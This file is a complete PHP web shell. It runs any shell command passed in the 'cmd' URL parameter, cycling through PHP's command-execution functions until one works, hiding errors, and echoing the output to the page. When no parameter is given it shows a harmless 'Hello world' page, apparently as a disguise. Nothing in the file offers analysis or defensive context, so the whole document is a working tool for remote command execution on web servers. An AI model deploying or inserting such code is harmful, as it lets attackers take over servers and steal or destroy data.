<?php
	function exe($cmd) {
        if (function_exists('system')) {
            @ob_start();
            @system($cmd);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return 'system:<br>' . $buff;
        } elseif (function_exists('exec')) {
            @exec($cmd, $results);
            $buff = "";
            foreach ($results as $result) {
                $buff .= $result;
            }
            return 'exec:<br>' . $buff;
        } elseif (function_exists('passthru')) {
            @ob_start();
            @passthru($cmd);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return 'passthru:<br>' . $buff;
        } elseif (function_exists('proc_open')) {
            $pipes = array();
            $process = @proc_open($cmd . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $buff = @stream_get_contents($pipes[1]);
            @proc_close($process);
            return 'proc_open:<br>' . $buff;
        } elseif (function_exists('popen')) {
			$handle = popen($cmd . ' 2>&1', 'r');
			$buff = "";
			while (!feof($handle)) {
		        $buff .= fread($handle, 1024);
		    }
			@pclose($handle);
            return 'popen:<br>' . $buff;
        }  
        elseif (function_exists('shell_exec')) {
            $buff = @shell_exec($cmd);
            return 'shell_exec:<br>' . $buff;
        } 
        else{
			try {
			    @eval('$a = 1+1;');
			    echo 'eval is available <br>';
			} catch (Throwable $e) {
				echo "eval is not available" . $e->getMessage() . "<br>";
			}
        	return 'None enabled execute functions';
        }
    }

	if(isset($_GET['cmd'])){
		$output = exe($_GET['cmd']);
		$output = nl2br($output);
		echo '<h3>'. $output . '</h3>';
	}
	else{
		echo '<h1>Hello world</h1>';
	}
?>